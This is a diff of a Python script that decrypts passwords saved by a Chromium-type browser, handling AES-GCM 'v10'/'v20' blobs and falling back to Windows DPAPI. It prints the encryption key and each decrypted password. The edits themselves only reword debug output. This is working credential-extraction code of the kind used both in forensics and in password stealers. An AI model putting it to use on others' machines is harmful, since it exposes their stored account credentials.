@@ -31,40 +31,47 @@ def get_encryption_key():
         print(f"[ERROR] Failed to retrieve encryption key: {e}")
         return None
 
+from binascii import hexlify
+
 def decrypt_password(encrypted_password_blob, key):
     if not encrypted_password_blob:
         print("[WARN] Empty password blob.")
         return "<empty blob>"
 
-    print(f"[DEBUG] Encrypted blob (hex): {hexlify(encrypted_password_blob).decode()}")
+    blob_hex = hexlify(encrypted_password_blob).decode()
+    print(f"[DEBUG] Encrypted blob (hex): {blob_hex}")
 
     try:
         prefix = encrypted_password_blob[:3]
         if prefix in (b'v10', b'v20'):
-            print(f"[DEBUG] AES-GCM format detected with prefix {prefix.decode()}.")
+            print(f"[DEBUG] AES-GCM format detected with prefix: {prefix.decode()}")
+
             iv = encrypted_password_blob[3:15]
             ciphertext = encrypted_password_blob[15:-16]
             tag = encrypted_password_blob[-16:]
 
-            print(f"  IV       : {hexlify(iv).decode()}")
-            print(f"  Cipher   : {hexlify(ciphertext).decode()}")
-            print(f"  Tag      : {hexlify(tag).decode()}")
-            print(f"  AES Key  : {hexlify(key).decode()}")
+            print(f"  IV        : {hexlify(iv).decode()}")
+            print(f"  Ciphertext: {hexlify(ciphertext).decode()}")
+            print(f"  Tag       : {hexlify(tag).decode()}")
+            print(f"  AES Key   : {hexlify(key).decode()}")
 
             cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
             decrypted = cipher.decrypt_and_verify(ciphertext, tag)
             decoded = decrypted.decode('utf-8')
             print(f"  Decrypted Password: {decoded}")
             return decoded
+
         else:
-            print("[DEBUG] Trying legacy DPAPI decryption.")
+            print("[DEBUG] Unknown prefix, trying DPAPI.")
             decrypted = win32crypt.CryptUnprotectData(encrypted_password_blob, None, None, None, 0)[1]
             decoded = decrypted.decode('utf-8')
             print(f"  DPAPI Decrypted Password: {decoded}")
             return decoded
+
     except Exception as e:
         print(f"[ERROR] Decryption failed: {e}")
         return "<decryption failed>"
+
 
 
 def main():
